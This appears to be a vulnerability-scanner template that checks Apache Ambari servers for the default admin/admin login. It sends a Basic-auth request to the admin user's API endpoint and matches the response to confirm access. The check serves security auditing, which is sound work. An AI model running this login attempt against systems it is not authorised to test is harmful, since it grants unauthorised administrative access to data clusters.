id: ambari-default-login
info:
  author: pdteam
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  description: An Apache Ambari default admin login was discovered.
  name: Apache Ambari Default Login
  reference:
  - https://ambari.apache.org/1.2.0/installing-hadoop-using-ambari/content/ambari-chap3-1.html
  severity: high
  tags: ambari,default-login,apache
requests:
- attack: pitchfork
  matchers:
  - condition: and
    type: word
    words:
    - '"Users" : {'
    - AMBARI.
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'GET /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name
    HTTP/1.1

    Host: {{Hostname}}

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
